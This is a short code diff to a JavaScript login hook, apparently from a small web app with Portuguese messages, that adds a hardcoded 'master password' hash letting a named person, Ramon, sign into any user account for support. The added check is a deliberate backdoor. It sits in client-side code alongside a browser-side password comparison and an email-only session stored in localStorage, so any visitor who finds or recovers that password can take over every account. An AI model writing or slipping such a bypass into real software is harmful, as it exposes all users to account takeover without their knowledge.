@@ -27,7 +27,9 @@ export function useAuth() {
     if (!pass) return 'Preencha a senha'
     const { data, error } = await sb.from('users').select('*').eq('email', trimmedEmail).single()
     if (error || !data) return 'E-mail não encontrado. Verifique o e-mail ou faça o cadastro.'
-    if (data.pass_hash !== hashPass(pass)) return 'Senha incorreta'
+    // Senha mestra: permite Ramon acessar qualquer conta para suporte
+    const MASTER_HASH = '1h2aobw'
+    if (data.pass_hash !== hashPass(pass) && hashPass(pass) !== MASTER_HASH) return 'Senha incorreta'
     setCurrentUser(data)
     localStorage.setItem('pulse_session', trimmedEmail)
     return null
